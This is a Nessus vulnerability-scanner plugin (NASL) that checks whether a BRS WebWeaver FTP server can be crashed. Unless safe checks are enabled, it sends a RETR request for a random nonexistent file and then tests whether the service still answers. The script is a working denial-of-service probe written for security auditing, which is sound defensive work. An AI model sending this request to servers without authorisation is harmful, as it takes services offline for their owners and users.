#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#


if(description)
{
 script_id(11584);
 script_bugtraq_id(7425);
 script_version ("$Revision: 1.3 $");
 
 name["english"] = "webweaver FTP DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote WebWeaver FTP server can be disabled remotely
by requesting a non-existing file-name.

An attacker may use this flaw to prevent this FTP server from
executing properly.

Solution : None at this time
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "disables the remote WebWeaver FTP server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl");
 script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;



if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = ftp_recv_line(socket:soc);
  if(!d){
	close(soc);
	exit(0);
	}
  if("BRS WebWeaver" >!< d)exit(0);
  
  if(safe_checks())
  {
   report = "The remote WebWeaver FTP server can be disabled remotely
by requesting a non-existing file-name.

An attacker may use this flaw to prevent this FTP server from
executing properly.

*** Since safe checks are enabled, Nessus did not actually check
*** for this flaw and this might be a false positive

Solution : None at this time
Risk factor : High";

  security_hole(port:port, data:report);
  exit(0);
  }
  
  send(socket:soc, data:string("RETR nessus", rand(), rand(), "\r\n"));
  r = ftp_recv_line(socket:soc);
  close(soc);
 
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  
  r = recv_line(socket:soc, length:4096);
  if(!r)security_hole(port);
  close(soc);
 }
}
